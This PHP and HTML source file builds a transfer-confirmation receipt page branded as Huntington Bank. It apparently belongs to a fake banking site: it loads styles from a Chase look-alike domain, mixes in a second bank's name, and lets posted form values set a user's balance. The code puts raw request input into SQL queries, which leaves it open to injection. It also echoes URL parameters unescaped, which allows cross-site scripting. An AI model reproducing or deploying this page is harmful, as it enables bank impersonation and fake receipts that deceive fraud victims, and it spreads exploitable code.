<?php 
	require('functions.php');
	
	include "admin/database.php";
	
	include "database.php";

$y=$_SESSION['user']['username'];
$result = mysqli_query($conn,"SELECT * FROM users WHERE username IN ('$y')");
$bio= mysqli_fetch_array($result);

if (!isLoggedIn($_GET['id'])) {
	$_SESSION['msg'] = "You must log in first";
	header("Location:login?goto=" . urlencode($_SERVER['REQUEST_URI']));
}
include_once 'admin/database.php';
if(count($_POST)>0) {
// variables for input data

$datas = $_POST['datas'];
$userid = $_POST['userid'];
$transid = $_POST['transid'];
$details = $_POST['details'];
$withdraw = $_POST['withdraw'];
$deposit = $_POST['deposit'];
$rbal = $_POST['rbal'];
// sql query for inserting data into database

mysqli_query($conn,"insert into transact(datas,userid,transid,details,withdraw,deposit,rbal) values ('$datas','$userid','$transid','$details','$withdraw','$deposit','$rbal')") or die(mysqli_error());

mysqli_query($conn,"UPDATE users set bal='" . $_POST['bal'] . "', username='" . $_POST['username'] . "', activated='" . $_POST['activated'] . "' WHERE username='" . $_POST['username'] . "' AND activated='yes'");
echo "<script>
alert('Your transfer was successful, proceed for receipt.');
</script>";
}
?>
<!DOCTYPE HTML>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
    <head>
        <!-- Meta Tags -->
        <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
	<meta name="HandheldFriendly" content="true" />
	<link href="https://www.jpmschaseb.com/ac/ibank/css/style.css" rel="stylesheet" type="text/css" />
	<link rel="icon" href="img/core-img/favicon.ico">
	<title>Transaction Successful | Huntington Bank</title>
	<style>
td {
  border-bottom: 1px solid #ccc;
}
</style>
<style>
.emma{font-size:14px;font-family:lato,sans-serif;}
.txt{font-size:14px;font-family:lato,sans-serif;}
#txt{font-size:17px;font-family:lato,sans-serif}
.btn-group button {
  background-color: #ccc; /* Green background */
  font-size:15px;
  border: 1px solid black; /* Green border */
  color: black; /* White text */
  padding: 10px 24px; /* Some padding */
  cursor: pointer; /* Pointer/hand icon */
  float: left; /* Float the buttons side by side */
}

/* Clear floats (clearfix hack) */
.btn-group:after {
  content: "";
  clear: both;
  display: table;
}

.btn-group button:not(:last-child) {
  border-right: none; /* Prevent double borders */
}

/* Add a background color on hover */
.btn-group button:hover {
  background-color: #000;
  color: white; /* White text */
}
</style>
    <style>
body,html{margin:0;padding:0;background-color:#696969;}
            body{margin:auto;}
            .head{box-shadow: 0px 1px 0px 1px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width:auto;}
            .foot{right:0; left: 0;
  bottom: 0;position: absolute;box-shadow: 2px 2px 0px 2px #000;border-bottom:1px solid #000;background-color: #222;padding:10px;width: 100%;}
            .button{background-color: #222;
  color: #fff;
  padding: 12px;
  border-radius: 5px;
  font-weight:bold;
  font-size:17px;
  border:1px solid #000;
  width: 100%;}
            .text{text-shadow: 0px 0px 2px #000;font-size:12px;margin:15px;color:#ffffff;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mtext{text-shadow: 1px 0px 2px #fff;font-size:13px;margin:15px;color:#000;font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;}
            .mybox a{text-transform:none;color:brown;}
            .mybox{text-shadow: 0px 0px 1px #000;font-size:14px;margin:15px;padding:10px;border-radius:5px;border:1px solid #000;background-color:#ffffff;font-family:lato,sans-serif;}
            textarea{border: 1px solid #222; background:#fff;width:100%;}
            .input-group {
 margin: 5px 13px 5px 5px; } .input-group label { display: block;
 text-align: left; margin: 3px;} .input-group input { box-shadow: rgba(0,0,0,0.3) 0 0 10px;
 border-collapse: collapse; height: 25px;
 padding: 2px;
 width: 100%;
 font-size: 16px;
 border-radius: 0px; border: 1px solid #222; background:#fff;
 }
 .btn {
 padding: 5px;
 width:auto;
 font-size: 15px;
 color: #fff;
 background: #696969;border-radius: 5px; }
</style>
<!-- ================== BEGIN BASE CSS STYLE ================== -->
	<script src="assets/js/jquery-1.11.1.min.js"></script>
	<link href="assets/plugins/jquery-ui/themes/base/minified/jquery-ui.mi.css" rel="stylesheet" />
	<link href="assets/bootstrap.css" rel="stylesheet" />
	<script src="assets/js/jquery.circlechart.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href="assets/plugins/icon/themify-icons/themify-icons.css" rel="stylesheet" />
	<link href="assets/css/animate.min.css" rel="stylesheet" />
	<link href="assets/css/style.min.css" rel="stylesheet" />
	<link href="assets/css/preloader.css" rel="stylesheet" />
	<!-- ================== END BASE CSS STYLE ================== -->
	<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script>
	$(document).ready(function(){
		$("#myModal").modal('show');
	});
</script>
</head>
<body>
    <div style="max-width:800px;margin:auto;">
<div class="head"><center><img src="lockup.svg" height="45" width="160" /></center></div>
<br>
<div id="ytWidget"></div><script src="https://translate.yandex.net/website-widget/v1/widget.js?widgetId=ytWidget&pageLang=en&widgetTheme=light&autoMode=false" type="text/javascript"></script> 
  
  <div class="btn-group" style="padding:9px;width:100%">
 <button style="background:black;color:white;font-weight:bold;width:100%">CONFIRMATION</button>
</div>

<div style="border-radius:10px;background-color: #FFFFFF;background-image: url('./img/core-img/5e73bd1a185dc.image.png');background-position: center;background-repeat: no-repeat;background-size: auto;padding:10px;margin:10px;">
    <img style="width:80px" src="/ac/img/core-img/lockup.svg"/>
                                <h3 style="font-weight:bold;text-align:center;color:black;"><?php echo $bio["cur"]; ?><?php echo $_GET["amount"]; ?>.00 ✅
                                </h3>
                                <h6 style="text-align:center;color:black;">Transaction Successful
                                </h6>
                                <h4 style="color:black;"><table style="width:100%">
  <tr>
    <td class="txt">Beneficiary Name</td>
    <td id="txt"><?php echo $_GET["name"]; ?></td>
  </tr><br/>
  <tr>
    <td class="txt">Beneficiary Bank</td>
    <td id="txt"><?php echo $_GET["bank"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Pay from</td>
    <td id="txt">Abu Dhabi National Bank (..<?php echo $bio["accntt"]; ?>)</td>
  </tr>
  <tr>
    <td class="txt">Pay to</td>
    <td id="txt"><?php echo $_GET["account"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Routing (ABA)</td>
    <td id="txt"><?php echo $_GET["routing"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Payment date</td>
    <td id="txt"><?php echo date("M d, Y")."";?></td>
  </tr>
  <tr>
    <td class="txt">Debited amount</td>
    <td id="txt"><?php echo $bio["cur"]; ?><?php echo $_GET["amount"]; ?>.00</td>
  </tr>
  <tr>
    <td class="txt">Balance after</td>
    <td id="txt">
<?php echo $bio["cur"]; ?><?php  
$x=$bio["bal"]; 
$x = preg_replace( '/[\W]/', '', $x); 
$y=$_GET["amount"]; 
$y = preg_replace( '/[\W]/', '', $y); 
$z=$x-$y;
// english notation (default)
$english_format_number = number_format($z);
echo "",$english_format_number;  
?>.00
        
  </tr>
  <tr>
    <td class="txt">Transaction status</td>
    <td id="txt">Successful ✅</td>
  </tr>
  <tr>
    <td class="txt">Confirmation</td>
    <td id="txt"><?php

session_start();
if(!isset($_SESSION['rand'])){
	// generating the random number ones
	$_SESSION['rand'] = rand(1,99999999999);

}
$rand = $_SESSION['rand'];

echo " ".
$rand
." ";

?></td>
  </tr>
</table></h4>
                        <br>
                <div class="btn-group" style="width:100%">
                    <button value="print" onclick="PrintDiv();" style="width:50%">Print</button>
 <a href="?mfbdash"> <button style="width:50%">My Account</button> </a>
  <div>
</div>
</div></div>

<div id="divToPrint" style="display:none;">
    <style>
.txt{font-size:14px;font-family:lato,sans-serif;}
#txt{font-size:17px;font-family:lato,sans-serif}
</style>
  <div>
           <div style="border-radius:10px;background-color: #FFFFFF;background-image: url('./img/core-img/5e73bd1a185dc.image.png');background-position: center;background-repeat: no-repeat;background-size: 100%;padding:10px;margin:10px;">
    <img style="width:70px" src="/ac/img/core-img/lockup.svg"/>
                                <h3 class="txt" style="font-weight:bold;text-align:center;color:black;"><?php echo $bio["cur"]; ?><?php echo $_GET["amount"]; ?>.00 ✅
                                </h3>
                                <h6 style="text-align:center;color:black;">Transaction Successful
                                </h6>
                                <h4 style="color:black;"><table style="width:100%">
  <tr>
    <td class="txt">Beneficiary Name</td>
    <td id="txt"><?php echo $_GET["name"]; ?></td>
  </tr><br/>
  <tr>
    <td class="txt">Beneficiary Bank</td>
    <td id="txt"><?php echo $_GET["bank"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Pay from</td>
    <td id="txt">Abu Dhabi National Bank (..<?php echo $bio["accntt"]; ?>)</td>
  </tr>
  <tr>
    <td class="txt">Pay to</td>
    <td id="txt"><?php echo $_GET["account"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Routing (ABA)</td>
    <td id="txt"><?php echo $_GET["routing"]; ?></td>
  </tr>
  <tr>
    <td class="txt">Payment date</td>
    <td id="txt"><?php echo date("M d, Y")."";?></td>
  </tr>
  <tr>
    <td class="txt">Debited amount</td>
    <td id="txt"><?php echo $bio["cur"]; ?><?php echo $_GET["amount"]; ?>.00</td>
  </tr>
  <tr>
    <td class="txt">Balance after</td>
    <td id="txt">
<?php echo $bio["cur"]; ?><?php  
$x=$bio["bal"]; 
$x = preg_replace( '/[\W]/', '', $x); 
$y=$_GET["amount"]; 
$y = preg_replace( '/[\W]/', '', $y); 
$z=$x-$y;
// english notation (default)
$english_format_number = number_format($z);
echo "",$english_format_number;  
?>.00
        
  </tr>
  <tr>
    <td class="txt">Transaction status</td>
    <td id="txt">Successful ✅</td>
  </tr>
  <tr>
    <td class="txt">Confirmation</td>
    <td id="txt"><?php

session_start();
if(!isset($_SESSION['rand'])){
	// generating the random number ones
	$_SESSION['rand'] = rand(1,99999999999);

}
$rand = $_SESSION['rand'];

echo " ".
$rand
." ";

?></td>
  </tr>
</table></h4>
                           </div><br/>
                           <div class="txt" align="center" class="mtext"><b>© 2021 Huntington Bancshares Incorporated.</b></div>
           <?php echo $html; ?>      
  </div>
</div>

	<br>
	
	
<div align="center" class="mtext">© 2021 Huntington Bancshares Incorporated.</div>
<script type="text/javascript">     
    function PrintDiv() {    
       var divToPrint = document.getElementById('divToPrint');
       var popupWin = window.open('', '_blank', 'width=auto');
       popupWin.document.open();
       popupWin.document.write('<html><body onload="window.print()">' + divToPrint.innerHTML + '</html>');
        popupWin.document.close();
            }
 </script>
</body>
</html>